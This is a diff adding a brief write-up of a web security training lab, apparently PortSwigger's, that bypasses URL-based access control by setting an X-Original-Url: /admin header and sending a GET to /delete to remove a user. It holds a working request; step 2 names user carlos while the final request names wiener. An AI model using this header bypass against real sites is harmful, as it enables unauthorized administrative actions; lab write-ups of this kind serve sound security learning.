@@ -1,0 +1,15 @@
+Lab #05: URL-based access control can be circumvented
+In this lab the admin is restricted to normal user but this can be circumvented by the custom header X-Original-Url.
+
+1. Put the X-Original-Url with the value /admin
+X-Original-Url: /admin
+
+2. Copy the delete user url to delete the carlos user
+https://0af400f1044b92c585400359000800fc.web-security-academy.net/admin/delete?username=carlos
+
+3. Put the /admin in the X-Original-Url header and rest of the url in the Get request
+
+GET /delete?username=wiener HTTP/2
+X-Original-Url: /admin
+
+
